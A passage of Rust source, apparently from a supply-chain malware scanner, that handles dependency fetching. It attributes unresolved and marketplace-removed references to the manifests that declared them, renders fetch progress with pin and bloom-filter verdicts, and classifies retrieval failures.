            "fetch-only: selected={} fetched={fetched} bytes={bytes}",
            records.len()
        );
        self.out.records.extend(records);
        self.stopped = true;
    }

    /// Close out the phase: settle the progress view and record, on each file
    /// that declared references, what became of them.
    fn finish(mut self, report: &mut AnalysisReport) -> FetchOutcome {
        if let Some(error) = self.pending_error {
            let mut record = FetchRecord::terminal(
                "fetch backlog".into(),
                Outcome::Failed(FetchError::Internal(error)),
            );
            record.coverage_note = Some("unfinished work could not be persisted".into());
            self.out.records.push(record);
        }
        self.reporter.finish(&self.out.records);
        attribute_reference_outcomes(report, &self.out.records, &self.registry_outcomes);
        self.out
    }
}

/// A copy of `r` whose offset is `index`. fletch drops references it will not
/// fetch and may refine a locator (a versionless PURL becomes the release it
/// resolved to), so neither a record's position nor its locator joins it back
/// to its reference; the offset fletch stamps on every record from its
/// reference does. See [`pair_records`].
fn keyed(r: &Reference, index: usize) -> Reference {
    let mut keyed = r.clone();
    keyed.offset = Some(index as u64);
    keyed
}

/// Put each record fletch returned in the slot of the reference it was fetched
/// for — the one whose index [`keyed`] stamped as its offset — and restore the
/// reference's real offset on the record.
fn pair_records(
    selected: &[Reference],
    records: impl IntoIterator<Item = FetchRecord>,
    slots: &mut [Option<(FetchRecord, Standing)>],
) {
    for mut record in records {
        let index = record
            .source_offset
            .and_then(|offset| usize::try_from(offset).ok())
            .filter(|&i| i < selected.len());
        let Some(i) = index else {
            tracing::error!(locator = %record.locator, "fetch record names no selected reference; dropped");
            continue;
        };
        record.source_offset = selected[i].offset;
        slots[i] = Some((record, Standing::Analyze));
    }
}

/// Record, on each file that declared a reference, what became of the
/// references it declared.
///
/// A resolved payload needs nothing here: `merge_payload` already grafts it
/// into the tree as a child of its declaring file, so its findings are reachable
/// from the declarer. An **unresolved** reference produces no payload and
/// therefore no node — which left the most interesting outcome of a follow the
/// one thing no trait could see.
///
/// It is worth seeing. A manifest naming a dependency the registry no longer
/// serves is pointing at something that was withdrawn, and packages get
/// withdrawn for reasons: the VS Code marketplace pulls extensions for malware,
/// npm unpublishes for the same. The declaring package is often still installed
/// everywhere, still pointing at it.
///
/// Attributed by `source_sha256`, the edge's declaring endpoint, so the facts
/// land on the manifest that made the claim rather than on the archive root.
/// Emitted as ordinary `references.*` metrics and values, so an ordinary
/// file-scoped trait reads them — no new composite scope required.
fn attribute_reference_outcomes(
    report: &mut AnalysisReport,
    records: &[FetchRecord],
    registry_outcomes: &BTreeMap<String, (u64, u64)>,
) {
    #[derive(Default)]
    struct Tally<'a> {
        declared: u64,
        unresolved: Vec<&'a str>,
    }

    let mut touched: Vec<String> = Vec::new();
    let mut by_source: BTreeMap<&str, Tally<'_>> = BTreeMap::new();
    for rec in records {
        let Some(source) = rec.source_sha256.as_deref() else {
            continue;
        };
        let tally = by_source.entry(source).or_default();
        tally.declared += 1;
        if matches!(rec.outcome, Outcome::Unresolved(_)) {
            tally.unresolved.push(rec.locator.as_str());
        }
    }

    // One pass, two sources. A reference can leave a fetch record, a registry
    // document, or both, and the declarer should carry its outcome either way --
    // reading only the fetch records meant a dependency resolved without a live
    // download was attributed nothing at all.
    for file in &mut report.files {
        let fetched = by_source.get(file.sha256.as_str());
        let registry = registry_outcomes.get(file.sha256.as_str());
        if fetched.is_none() && registry.is_none() {
            continue;
        }
        let declared = fetched
            .map_or(0, |t| t.declared)
            .max(registry.map_or(0, |r| r.0));
        let unresolved = fetched.map_or(0, |t| t.unresolved.len() as u64);
        let held = registry.map_or(0, |r| r.1);
        let metrics = file.filefacts_metrics.get_or_insert_with(Default::default);
        metrics.insert("references.declared_count".to_string(), declared as f64);
        metrics.insert("references.unresolved_count".to_string(), unresolved as f64);
        metrics.insert("references.security_hold_count".to_string(), held as f64);
        // Editor-marketplace removals get their own count, because they do not
        // mean what a registry 404 means. npm serves a 404 for a private name,
        // a typo, or a package that moved; the VS Code and Open VSX galleries
        // *remove* extensions, and removal is what they do to malware. A rule
        // convicting on the first would be noise and on the second is not.
        //
        // Two fixed keys rather than one per ecosystem: the metric catalog
        // checks exact names, so a key built from whatever PURL type happened
        // to appear could never be declared, and an undeclared key validates
        // against nothing. An archive member also carries no values tree for a
        // `type: value` list to read, so a metric is the only surface that
        // survives member retention.
        let extension_unresolved = fetched.map_or(0, |t| {
            t.unresolved
                .iter()
                .filter(|l| {
                    Coordinate::of(l).is_some_and(|c| matches!(c.typ, "vscode" | "openvsx"))
                })
                .count()
        });
        metrics.insert(
            "references.unresolved_extension_count".to_string(),
            extension_unresolved as f64,
        );
        touched.push(file.sha256.clone());
    }

    // Trait evaluation already ran, before the follow phase that produced these
    // facts. Re-run it for just the files whose facts changed, so the rules that
    // read `references.*` get their pass.
    for sha in touched {
        match cleave::graft_reference_outcome_traits(report, &sha, &AnalysisOptions::default()) {
            Ok(0) => {}
            Err(e) => tracing::warn!(sha = %sha, "reference-outcome pass failed: {e:#}"),
            Ok(n) => tracing::debug!(
                grafted = n,
                sha = %sha,
                "reference-outcome traits fired on a declaring file"
            ),
        }
    }
}

/// Where the fetch phase's progress is surfaced.
///
/// `Off` — machine output (JSON/tiny/server): nothing is printed; the edges ride
/// the report. `Stream` — the fetch work is folded into the active scan bar; only
/// actionable per-reference outcomes are logged above it. `Tree` — the live,
/// in-place dependency tree that takes over stderr for an interactive
/// single-artifact scan (see
/// [`crate::deptree`]), listing the whole known set up front and animating each
/// row through its lifecycle.
///
/// The methods take `&self` so the fetch completion callback — invoked
/// concurrently from fletch's pool — can share one reporter with the sequential
/// orchestration.
enum Reporter {
    Off,
    Stream {
        external_dependencies: AtomicU32,
        external_urls: AtomicU32,
        budget_notice: AtomicBool,
        /// Rows already printed, as `outcome + target`. One dependency named by
        /// forty manifests is one fact, and a scan of a monorepo was spending
        /// most of its output restating it.
        printed: std::sync::Mutex<HashSet<String>>,
    },
    Tree {
        tree: DepTree,
        budget_notice: std::sync::Mutex<Option<String>>,
    },
}

impl Reporter {
    /// Choose a channel: the live tree when it can own the terminal, else the
    /// stream when progress is requested, else off.
    fn new(progress: bool) -> Self {
        if !progress {
            return Self::Off;
        }
        DepTree::activate().map_or_else(
            || Self::Stream {
                external_dependencies: AtomicU32::new(0),
                external_urls: AtomicU32::new(0),
                budget_notice: AtomicBool::new(false),
                printed: std::sync::Mutex::new(HashSet::new()),
            },
            |tree| Self::Tree {
                tree,
                budget_notice: std::sync::Mutex::new(None),
            },
        )
    }

    /// Reveal a hop's references as pending (tree only) so the whole known set is
    /// visible before any network work begins. `source` is the manifest they were
    /// declared in (package-relative path), shown per row so each dependency can
    /// be traced back to its declaring file.
    fn announce(&self, refs: &[Reference], source: &str) {
        if let Self::Tree { tree, .. } = self {
            for r in refs {
                tree.add(locator(r), &dep_display_name(r), source);
            }
        }
    }

    /// Mark the to-fetch set in flight. The stream folds its counts into the
    /// active scan bar; the tree animates each row in place.
    fn fetching(&self, refs: &[Reference]) {
        match self {
            Self::Stream {
                external_dependencies,
                external_urls,
                ..
            } => {
                let urls = refs.iter().filter(|r| r.kind == RefKind::UrlFetch).count();
                let dependencies = refs.len().saturating_sub(urls);
                let dependencies_u32 = u32::try_from(dependencies).unwrap_or(u32::MAX);
                let urls_u32 = u32::try_from(urls).unwrap_or(u32::MAX);
                external_dependencies.fetch_add(dependencies_u32, Ordering::Relaxed);
                external_urls.fetch_add(urls_u32, Ordering::Relaxed);
                crate::engine::external_fetch_started(dependencies, urls);
            }
            Self::Tree { tree, .. } => {
                for r in refs {
                    tree.set(locator(r), DepState::Fetching);
                }
            }
            Self::Off => {}
        }
    }

    /// A fetch landed: move its row to "analyzing" (bytes in hand, scan pending)
    /// or settle it (skipped/failed/budget). Tree only — keyed on the original
    /// reference, so a locator refined during fetch still matches the row. Called
    /// live per completion and again authoritatively after the batch; both are
    /// idempotent.
    fn landed(&self, r: &Reference, rec: &FetchRecord) {
        if let Self::Tree { tree, .. } = self {
            if matches!(rec.outcome, Outcome::BudgetExceeded) || !terminal_fetch_row_visible(rec) {
                tree.set(locator(r), DepState::Hidden);
            } else {
                tree.set(locator(r), landed_state(rec));
            }
        }
    }

    /// Print an actionable streamed fetch line (stream only); successful fetches
    /// are represented by the aggregate header and final summary. The tree
    /// already moved this row in [`Reporter::landed`].
    ///
    /// Successful rows are intentionally omitted; failures, skips, and pin
    /// mismatches remain visible because they need attention.
    fn report(&self, rec: &FetchRecord, budget_notice: &str) {
        if matches!(rec.outcome, Outcome::BudgetExceeded) {
            match self {
                Self::Off => {}
                Self::Stream {
                    budget_notice: emitted,
                    ..
                } => {
                    if !emitted.swap(true, Ordering::Relaxed) {
                        tracing::debug!(
                            message = budget_notice,
                            "fetch budget exceeded; remaining references skipped"
                        );
                    }
                }
                Self::Tree {
                    budget_notice: stored,
                    ..
                } => {
                    stored
                        .lock()
                        .unwrap_or_else(PoisonError::into_inner)
                        .get_or_insert_with(|| budget_notice.to_owned());
                }
            }
            return;
        }
        if !terminal_fetch_row_visible(rec) {
            match &rec.outcome {
                Outcome::Failed(why) => tracing::debug!(
                    locator = %rec.locator,
                    url = rec.resolved_url.as_deref(),
                    status = ?rec.status,
                    why = %why,
                    "fetch: artifact absent from its registry"
                ),
                Outcome::Skipped if rec.content_sha256.is_some() => tracing::debug!(
                    locator = %rec.locator,
                    content_sha = ?rec.content_sha256,
                    "fetch: verdict already stands in the corpus"
                ),
                _ => {}
            }
            return;
        }
        if let Self::Stream { .. } = self {
            // The streamed log is the attention channel: successes are carried
            // by the aggregate header and the final summary, and only failures
            // and pin trouble earn a line.
            if matches!(rec.outcome, Outcome::Ok) {
                return;
            }
            if !self.claim_row(rec) {
                return;
            }
            crate::engine::print_above_bar(|| report_fetch(rec));
        }
    }

    /// Whether this row is the first of its kind, claiming it if so. A row is
    /// its outcome over its target, because that pair is the whole of what the
    /// line says: one dependency named by forty manifests fails identically
    /// forty times, and a scan of a monorepo was spending most of its output
    /// restating it. Non-stream reporters never dedup — the tree already keys
    /// its rows by locator, and `Off` prints nothing.
    fn claim_row(&self, rec: &FetchRecord) -> bool {
        let Self::Stream { printed, .. } = self else {
            return true;
        };
        printed
            .lock()
            .unwrap_or_else(PoisonError::into_inner)
            .insert(format!("{:?}\x1f{}", rec.outcome, fetch_target(rec)))
    }

    /// A payload finished analysis: settle its row to the final fetch glyph
    /// (tree only).
    fn analyzed(&self, r: &Reference, rec: &FetchRecord) {
        if let Self::Tree { tree, .. } = self {
            tree.set(locator(r), done_state(rec));
        }
    }

    /// A dependency was skipped at the age gate. An aged-out dep (the common
    /// case, only a metadata lookup ran) is dropped entirely, in both the stream
    /// and the tree; a withdrawn version is surfaced in both; a known-good
    /// coordinate reaches the tree but not the streamed log. The tree wasn't
    /// told about aged-outs (`announce` sees only the kept set), so it adds a
    /// row here for the skips it does surface.
    fn skipped(&self, r: &Reference, reg: &Registry, now: u64, reason: SkipReason) {
        if matches!(reason, SkipReason::AgedOut) {
            return;
        }
        match self {
            Self::Off => {}
            // A known-good coordinate is the common case in any real lockfile —
            // hundreds of them, each saying the same nothing-to-see — so the
            // streamed log keeps only the withdrawn versions, which are a
            // finding. The tree still shows both: its rows are bounded and
            // rewritten in place.
            Self::Stream { .. } if matches!(reason, SkipReason::KnownGood) => {
                tracing::debug!(
                    locator = %locator(r),
                    age_days = reg.age_secs(now).unwrap_or(0) / 86_400,
                    "fetch: known-good dependency skipped"
                );
            }
            Self::Stream { .. } => {
                crate::engine::print_above_bar(|| report_skip(r, reg, now, reason))
            }
            Self::Tree { tree, .. } => {
                tree.add(locator(r), &dep_display_name(r), "");
                tree.set(locator(r), skip_state(reg, now, reason));
            }
        }
    }

    /// Close out the phase: the stream prints its one-line tally (only if it ever
    /// printed a row); the tree settles and prints the same tally beneath the
    /// dependency rows.
    fn finish(&self, records: &[FetchRecord]) {
        match self {
            Self::Off => {}
            Self::Stream {
                external_dependencies,
                external_urls,
                ..
            } => {
                let dependencies = external_dependencies.swap(0, Ordering::Relaxed);
                let urls = external_urls.swap(0, Ordering::Relaxed);
                crate::engine::external_fetch_finished(dependencies as usize, urls as usize);
            }
            Self::Tree {
                tree,
                budget_notice,
            } => {
                tree.finish(&summary_line(records));
                let message = budget_notice
                    .lock()
                    .unwrap_or_else(PoisonError::into_inner)
                    .take();
                if let Some(message) = message {
                    eprintln!("    {message}");
                }
            }
        }
    }
}

/// The fetch log's palette, matching the scan progress bar's truecolor one.
const LIVE: Rgb = Rgb(100, 180, 255);
const CACHED: Rgb = Rgb(120, 200, 140);
const CAUTION: Rgb = Rgb(230, 180, 80);
const FAILED: Rgb = Rgb(255, 90, 90);
const GOOD: Rgb = Rgb(80, 200, 80);
const MUTED: Rgb = Rgb(120, 120, 120);
const DETAIL: Rgb = Rgb(130, 130, 130);
const LABEL: Rgb = Rgb(160, 160, 160);

/// The source manifest's path as the dep tree shows it, led by the scanned
/// artifact so a nested manifest reads plainly as a file *inside* it:
/// `demo.zip!!vexium-1.0.tgz!!package/package.json` →
/// `demo.zip/vexium-1.0.tgz/package/package.json`. The root is reduced to its
/// basename (`/tmp/demo.zip` → `demo.zip`) and deeper archive boundaries become
/// `/`. A bare path with no archive nesting (a plain manifest scanned directly)
/// shows just its basename.
fn manifest_relpath(path: &str) -> String {
    match path.split_once("!!") {
        Some((root, rest)) => {
            let root_base = root.rsplit(['/', '\\']).next().unwrap_or(root);
            format!("{root_base}/{}", rest.replace("!!", "/"))
        }
        None => path.rsplit(['/', '\\']).next().unwrap_or(path).to_string(),
    }
}

/// A compact, human display name for a reference: `name version` for a PURL
/// (scope preserved, e.g. `@biomejs/cli-darwin-arm64 2.5.0`), or the URL with
/// its scheme trimmed. This is what the tree shows in place of the full registry
/// URL the streamed log prints.
fn dep_display_name(r: &Reference) -> String {
    match &r.locator {
        RefLocator::Purl(p) => purl_display(p),
        RefLocator::Url(u) | RefLocator::Path(u) => u
            .strip_prefix("https://")
            .or_else(|| u.strip_prefix("http://"))
            .unwrap_or(u)
            .to_string(),
        _ => String::new(),
    }
}

/// Render a PURL as `name version`. `pkg:npm/%40scope/pkg@1.2.3` becomes
/// `@scope/pkg 1.2.3`; a versionless coordinate shows just the name. Falls back
/// to the raw PURL for anything that doesn't parse.
fn purl_display(purl: &str) -> String {
    let Some(coordinate) = Coordinate::of(purl) else {
        return purl.to_string();
    };
    let name = coordinate.path.replace("%40", "@");
    match coordinate.version.filter(|v| !v.is_empty()) {
        Some(version) => format!("{name} {version}"),
        None => name,
    }
}

/// Whether a fetch put bytes in our hands: a clean fetch, bytes whose hash
/// contradicted the declared pin, or bytes carrying a pin Fletch cannot verify.
/// All three are worth scanning — the two pin outcomes most of all — while an
/// unresolved, skipped, budget-capped, or failed fetch has nothing to scan.
fn delivered_bytes(rec: &FetchRecord) -> bool {
    matches!(
        rec.outcome,
        Outcome::Ok | Outcome::PinMismatch | Outcome::UnverifiablePin
    )
}

/// What a fetch is shown and filed under: the URL it resolved to, or the bare
/// locator when it never resolved to one.
pub(crate) fn fetch_target(rec: &FetchRecord) -> &str {
    rec.resolved_url.as_deref().unwrap_or(&rec.locator)
}

/// The tree state for a fetch the moment it lands: "analyzing" when bytes are in
/// hand and a scan will follow (an `Ok`, a pin mismatch, or an unverifiable pin —
/// each pin outcome settles to its own glyph once analyzed), else the settled
/// fetch glyph.
fn landed_state(rec: &FetchRecord) -> DepState {
    if delivered_bytes(rec) {
        DepState::Analyzing
    } else {
        done_state(rec)
    }
}

/// The settled tree state for a fetch: the shared [`fetch_row`] glyph/colour,
/// with the detail column (a size, or a failure note) as its trailing text.
fn done_state(rec: &FetchRecord) -> DepState {
    if !terminal_fetch_row_visible(rec) {
        return DepState::Hidden;
    }
    let row = fetch_row(rec);
    DepState::Done {
        glyph: row.glyph,
        color: row.color,
        detail: row
            .detail
            .unwrap_or_else(|| rec.size.map_or(String::new(), human_bytes)),
    }
}

/// The settled tree state for an age-gate skip, mirroring [`report_skip`]'s
/// glyph and colour with a concise reason as the detail.
fn skip_state(reg: &Registry, now: u64, reason: SkipReason) -> DepState {
    let age_days = reg.age_secs(now).unwrap_or(0) / 86_400;
    let (glyph, color, detail) = match reason {
        SkipReason::KnownGood => ('\u{2713}', GOOD, "known-good".to_string()),
        SkipReason::Removed => ('\u{00b7}', MUTED, "removed".to_string()),
        SkipReason::AgedOut => ('\u{00b7}', MUTED, format!("{age_days}d old")),
    };
    DepState::Done {
        glyph,
        color,
        detail,
    }
}

/// The artifact could not be retrieved: the registry refused it, the locator
/// resolved to no URL, or the budget ran out before it was reached.
///
/// A distinct type rather than a message, because the difference between "this
/// artifact is not available" and "this server is broken" decides an HTTP
/// status, and a status decides what every caller upstream does next. Beamline
/// reads a 5xx as a sick worker: it opens that worker's circuit breaker, moves
/// the request to the next one, and reports `unavailable` once the fleet is
/// exhausted — so a package nobody can download used to eject healthy workers
/// from the pool and arrive at poppy as an outage rather than a download
/// failure. Classifying that on a substring of a `Debug`-formatted outcome is
/// how it went unnoticed; the type cannot be reworded by accident.
#[derive(Debug)]
pub struct Unretrievable {
    /// What was asked for: the resolved URL, or the locator when there was
    /// none to resolve.
    pub target: String,
    /// How the fetch ended. Carried so a caller can tell a refusal apart from
    /// a budget stop without re-parsing the message.
    pub outcome: Outcome,
}

impl std::fmt::Display for Unretrievable {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let why = match &self.outcome {
            Outcome::Failed(error) => failure_detail(error),
            Outcome::Unresolved(reason) => format!("unresolved ({reason:?})"),
            Outcome::BudgetExceeded => "fetch budget exhausted".to_string(),
            other => format!("{other:?}"),
        };
        write!(f, "fetch retrieved nothing for {}: {why}", self.target)
    }
}

impl std::error::Error for Unretrievable {}

/// Fetch a single external reference — a `pkg:` PURL or a URL — and return its
/// bytes, a filename for cleave's type detection, and the fetch record. Powers
/// the `pkg`/`url` subcommands: one artifact, pulled and handed to the scanner.
/// On a terminal (`progress`), logs the live/cache outcome and resolved URL,
/// matching `--fetch`. Errors if the client/cache is unavailable
/// ([`anyhow::Error`]) or nothing was retrieved ([`Unretrievable`]).
pub fn fetch_one(
    locator: RefLocator,
    progress: bool,
) -> anyhow::Result<(Vec<u8>, String, FetchRecord)> {
    let Some(res) = shared_resources() else {
        anyhow::bail!("fetch unavailable: HTTP client or blob cache could not be initialized");
    };
    let kind = match &locator {
        RefLocator::Purl(_) => RefKind::Dependency,
        RefLocator::Url(_) => RefKind::UrlFetch,
        RefLocator::Path(_) => RefKind::Local,
        _ => RefKind::Undefined,
    };
    let reference = Reference::new(locator, kind, "cli", "");
    let rec = fetch_ref(&reference, &res.net, &res.cache);
    if progress {
        eprintln!("\n  {}  {}", fg(LIVE, "\u{2b07}"), fg(LABEL, "fetching"));
        report_fetch(&rec);
    }
    if !delivered_bytes(&rec) {
        return Err(Unretrievable {
            target: fetch_target(&rec).to_string(),
            outcome: rec.outcome.clone(),
        }
        .into());
    }
    let bytes = res
        .cache
        .load(&rec.locator)
        .ok_or_else(|| anyhow::anyhow!("fetched content for {} not in cache", rec.locator))?;
    let name = payload_name(&rec);
    Ok((bytes, name, rec))
}

/// Serialize a registry record to its `*.registry.json` document — its synthetic
/// name and bytes — so the one-shot `pkg:`/`url` path can scan the registry
/// metadata directly when the artifact itself can't be fetched (e.g. the version
/// was unpublished). `None` if it can't be serialized.
#[must_use]
pub fn registry_document(reg: &Registry) -> Option<(String, Vec<u8>)> {
    Some((registry_doc_name(reg), serde_json::to_vec(reg).ok()?))
}

/// Look up normalized registry metadata plus the provider documents it came
/// from, with relative age stamped. Used by one-shot packages and memo-hit
/// dependency scans; fletch's blob cache prevents a network refetch.
#[must_use]
pub fn registry_with_sources(
    locator: &RefLocator,
) -> (Option<Registry>, Vec<fletch::fetch::RecordedSource>) {
    let Some(res) = shared_resources() else {
        return (None, Vec::new());
    };
    let (record, sources) = fletch::registry_with_sources(locator, &res.net, &res.cache);
    (record.map(|reg| reg.with_age(unix_now())), sources)
}

/// One-shot `pkg:`/`url`: graft the root artifact's own registry metadata into
/// its finalized report as a child node of the root, then run the package pass.
///
/// The registry record is materialized as a `*.registry.json` node — detected as
/// the `registry` filetype, carrying `registry.*` facts — and merged under the
/// root, exactly as the `--fetch` path grafts a dependency's registry beside the
/// dependency. So the registry metadata becomes a real layer of the analyzed
/// package: it is trait-matched, featurized, and trained on like any other file,
/// rather than living in a disconnected side report. With both halves now in one
/// tree, [`apply_package_composites`] correlates the artifact's behavior with the
/// registry's account of it. A no-op if the report has no root or the record
/// can't be analyzed.
pub(crate) fn graft_root_registry(report: &mut AnalysisReport, reg: &Registry) {
    let Some(root_sha) = report.files.first().map(|f| f.sha256.clone()) else {
        return;
    };
    let opts = AnalysisOptions::default();
    let Some(sub) = registry_node(reg, &opts) else {
        return;
    };
    // The artifact's own findings (before the registry node joins the tree) and
    // the registry node's findings — the two halves of the package pass.
    let artifact = sub_findings(report);
    let registry = sub_findings(&sub);
    let mut graft = Graft::new(report);
    merge_registry(report, &mut graft, &root_sha, sub);
    apply_package_composites(report, &root_sha, &artifact, &registry, &opts);
}

/// The registry's account of a package as display fields: version, age, author,
/// popularity, rating, license, and any deprecation notice.
///
/// One reader for both places a scan states them — the one-shot `pkg`/`url`
/// banner and the card of a locally collected sample — so the same package
/// reads the same way whichever way it was reached.
pub(crate) fn registry_summary(reg: &Registry) -> Vec<String> {
    let mut parts: Vec<String> = Vec::new();
    if !reg.version.is_empty() {
        parts.push(format!("v{}", reg.version.trim_start_matches('v')));
    }
    if let Some(d) = reg.age_days {
        parts.push(format!("{d}d old"));
    }
    if let Some(a) = &reg.author {
        parts.push(format!("by {a}"));
    }
    if let Some(d) = reg.downloads_recent.or(reg.downloads_total) {
        parts.push(format!("{d} dl"));
    }
    if let Some(r) = reg.rating {
        parts.push(format!("\u{2605}{r:.1}"));
    }
    if let Some(l) = &reg.license {
        parts.push(l.clone());
    }
    if let Some(dep) = &reg.deprecated {
        parts.push(format!("\u{26a0} {dep}"));
    }
    parts
}

/// Print and log a package's normalized registry metadata for the one-shot
/// `pkg`/`url` scan path, so the operator sees the registry's own account of an
/// artifact (age, author, popularity, deprecation) beside the scan of its bytes.
pub fn report_registry(reg: &Registry, progress: bool) {
    tracing::info!(
        ecosystem = %reg.ecosystem,
        package = %reg.name,
        version = %reg.version,
        age_days = reg.age_days,
        author = reg.author.as_deref(),
        downloads = reg.downloads_recent.or(reg.downloads_total),
        deprecated = reg.deprecated.as_deref(),
        "package registry metadata"
    );
    if !progress {
        return;
    }
    eprintln!(
        "\n  {}  {} {}",
        fg(Rgb(180, 160, 255), "\u{24d8}"),
        fg(LABEL, "registry"),
        fg(MUTED, &reg.ecosystem)
    );
    let parts = registry_summary(reg);
    if !parts.is_empty() {
        eprintln!("    {}", fg(DETAIL, &parts.join("  \u{00b7}  ")));
    }
}

/// Render one fetched reference to stderr, distinguishing a live network fetch
/// from a cache hit and naming the actual URL that was (or would be) retrieved.
/// Only the interactive terminal path passes `progress`; JSON/server callers
/// stay silent.
fn report_fetch(rec: &FetchRecord) {
    if !terminal_fetch_row_visible(rec) {
        return;
    }
    let row = fetch_row(rec);
    // A redirect lands the payload elsewhere — name the host, dimmed. Only the
    // host: a release-asset redirect carries a time-limited SAS token and JWT in
    // its query, which are noise on the line and a credential better kept out of
    // terminals and logs.
    let redirect = rec
        .final_url
        .as_deref()
        .filter(|f| Some(*f) != rec.resolved_url.as_deref())
        .and_then(|f| Url::parse(f).ok())
        .map(|f| {
            format!(
                "  {}",
                fg(MUTED, &format!("\u{2192} {}", hosts::authority(&f)))
            )
        })
        .unwrap_or_default();
    let column = row
        .detail
        .unwrap_or_else(|| rec.size.map_or(String::new(), human_bytes));
    eprintln!(
        "    {} {}  {}{redirect}",
        fg(row.color, &format!("{} {:<6}", row.glyph, row.label)),
        fg(DETAIL, &format!("{column:>10}")),
        fetch_target(rec)
    );
}

/// Whether one fetch outcome deserves a terminal row. An unresolved locator
/// produced no bytes and carries no actionable failure detail, and a non-target
/// reference (a source repo, an unclassified string) was never going to be
/// fetched at all — a row for either says nothing about the artifact being
/// scanned. Retain their [`FetchRecord`]s for machine output and diagnostics,
/// but keep the default human view quiet.
///
/// A corpus hit (see [`corpus_hit_record`]) is quiet for the same reason: the
/// fleet already judged those bytes, so there is nothing here to look at.
fn terminal_fetch_row_visible(rec: &FetchRecord) -> bool {
    match rec.outcome {
        Outcome::Unresolved(_) | Outcome::Skipped => false,
        Outcome::Failed(_) => !artifact_absent(rec),
        _ => true,
    }
}

/// Whether a failed fetch failed because the artifact is simply not there:
/// `404` (never published, or a name the registry doesn't carry) or `410`
/// (withdrawn). Neither says anything about the artifact being scanned — a
/// manifest naming a package no registry ever had is a fact about the manifest
/// — and a large lockfile produces them by the dozen, so they are recorded and
/// logged at debug rather than printed. Every other failure (transport,
/// timeout, `5xx`, a `403` that may be an authenticated mirror) is a fetch that
/// *should* have worked, and stays visible.
fn artifact_absent(rec: &FetchRecord) -> bool {
    matches!(rec.status, Some(404 | 410))
}

/// How one fetch outcome reads in the terminal: a glyph and short label in one
/// colour, and the detail that replaces the size column when the fetch
/// delivered no bytes.
struct FetchRow {
    glyph: char,
    label: &'static str,
    color: Rgb,
    detail: Option<String>,
}

impl FetchRow {
    const fn new(glyph: char, label: &'static str, color: Rgb) -> Self {
        Self {
            glyph,
            label,
            color,
            detail: None,
        }
    }

    fn detail(mut self, detail: String) -> Self {
        self.detail = Some(detail);
        self
    }
}

/// The display row for a fetch outcome. Shared by the streamed log
/// ([`report_fetch`]) and the live tree, so a dependency reads the same either
/// way: a *fetched* dep the local bloom filters vouch for (or flag) is relabeled
/// `known` instead of `live`/`cache`; `skip`/`fail` rows are left as-is.
fn fetch_row(rec: &FetchRecord) -> FetchRow {
    match &rec.outcome {
        Outcome::PinMismatch => {
            FetchRow::new('\u{2716}', "pin!", FAILED).detail("hash mismatch".to_string())
        }
        Outcome::UnverifiablePin => {
            FetchRow::new('\u{25cb}', "pin?", CAUTION).detail("pin unverifiable".to_string())
        }
        Outcome::Ok if rec.served == Some(Served::StaleCache) => {
            FetchRow::new('\u{25cf}', "stale", CAUTION)
        }
        Outcome::Ok => bloom_fetch_verdict(rec).unwrap_or_else(|| {
            if rec.is_cached() {
                FetchRow::new('\u{25cf}', "cache", CACHED)
            } else {
                FetchRow::new('\u{2b07}', "live", LIVE)
            }
        }),
        Outcome::BudgetExceeded => {
            FetchRow::new('\u{25cb}', "budget", CAUTION).detail("over fetch budget".to_string())
        }
        Outcome::Unresolved(_) => {
            FetchRow::new('\u{00b7}', "skip", MUTED).detail("unresolved".to_string())
        }
        // Never rendered — every `Skipped` is hidden (see
        // `terminal_fetch_row_visible`) — but the match must still name it.
        Outcome::Skipped => {
            FetchRow::new('\u{00b7}', "skip", MUTED).detail("not a target".to_string())
        }
        Outcome::Failed(why) => {
            FetchRow::new('\u{2716}', "fail", FAILED).detail(failure_detail(why))
        }
    }
}

/// A bloom verdict for a fetched artifact, as a `report_fetch` row override:
/// every known state renders as the `known` label, distinguished by glyph —
/// 🚩 known-bad, 🏴 conflicted, 👁 sighted by somebody else (all still scanned;
/// the flag also rides the result header), green ✓ known-good (fetched here
/// only because a pulled/fresh exception forced a re-scan). `None` when bloom
/// is disabled or the artifact is in neither set.
///
/// The digest and the PURL both name this one artifact, so both are handed to
/// the filters together and `burton` combines them: the worst claim against
/// either wins, and the green tick requires every key to agree. Deciding here
/// by hand is what once let this row show a blessed coordinate as clean while
/// its digest was cited by threat intelligence.
fn bloom_fetch_verdict(rec: &FetchRecord) -> Option<FetchRow> {
    use crate::bloom_repo::Decision;
    let lookup = crate::bloom_repo::global()?;

    let digest = rec
        .content_sha256
        .as_deref()
        .and_then(burton::parse_sha256_hex);
    let purl = rec
        .locator
        .starts_with("pkg:")
        .then_some(rec.locator.as_str());
    if digest.is_none() && purl.is_none() {
        return None;
    }

    let (glyph, color) = match lookup.decide_any(purl, digest.as_ref()) {
        Decision::Conflicted => ('\u{1f3f4}', CAUTION), // 🏴
        Decision::KnownBad => ('\u{1f6a9}', Rgb(235, 120, 120)), // 🚩
        Decision::SightedHostile | Decision::SightedSuspicious => ('\u{1f441}', Rgb(235, 170, 120)), // 👁
        Decision::Skip => ('\u{2713}', GOOD),
        Decision::Unknown => return None,
    };
    Some(FetchRow::new(glyph, "known", color))
}

/// The compact failure note for a failed fetch — the HTTP status when the
/// server answered with one (the common, informative case), else the kind of
/// failure without its detail, which runs long.
fn failure_detail(why: &FetchError) -> String {
    match why {
        FetchError::Status(status) => format!("HTTP {status}"),
        FetchError::Refused(_) => "refused".to_string(),
        FetchError::Transport(_) => "transport".to_string(),
        FetchError::Internal(_) => "internal error".to_string(),
        // Too large, timed out, or a failure this scan predates: its own
        // message is short.
        _ => why.to_string(),
    }
}

/// Why a dependency's artifact fetch was skipped. The registry record is
/// materialized (and trait-matched) in every case; only the byte fetch+scan is
/// skipped. Drives how the skip is surfaced in the fetch progress block.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SkipReason {
    /// Older than `--max-dep-age`. The common, expected case — reported at debug
    /// only, no progress line.
    AgedOut,
    /// The version was unpublished/yanked from the registry — no artifact to
    /// fetch. Rare and worth surfacing.
    Removed,
    /// The *resolved* coordinate is vouched by the known-good bloom, and its
    /// trust is not stale. Reached only by references whose declared locator
    /// carried no version (a manifest range), which the pre-lookup probe in
    /// [`age_gate`] cannot match; pinned coordinates are filtered before the
    /// lookup instead.
    KnownGood,
}

impl SkipReason {
    /// Why the artifact is absent, as provenance output states it.
    const fn artifact_note(self) -> &'static str {
        match self {
            Self::Removed => "version removed",
            Self::AgedOut => "older than fetch age limit",
            Self::KnownGood => "known-good coordinate",
        }
    }

    /// The reason a skip log line gives.
    const fn log_reason(self) -> &'static str {
        match self {
